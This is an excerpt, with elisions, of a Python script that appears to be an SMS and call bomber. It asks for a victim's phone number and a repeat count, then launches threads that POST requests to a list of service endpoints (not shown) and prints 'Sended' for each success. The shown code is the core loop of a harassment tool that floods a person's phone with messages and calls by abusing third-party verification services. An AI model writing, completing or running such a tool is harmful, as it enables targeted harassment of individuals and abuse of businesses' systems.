...
def sms(url, header):
    ...
    try:
        resp = requests.post(url, headers = {"Content-Type": "application/json"}, data = jsonData)
        if resp.status_code != 200:
            print("\033[01;31m[-] Error ! ")
        else:
            print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
...
def main():
    ...
    \t\t\t\t\t\t\t\t\t\t """)
    phone = input("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone 09xxxxxxxxxx: \033[00;36m")
    repeatCount = int(input("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms and call: \033[00;36m"))
    ...
    for i in range(repeatCount):
        for url, header in zip(urls, headers):
            t = threading.Thread(target=sms,args=(url,header,))
            t.start()
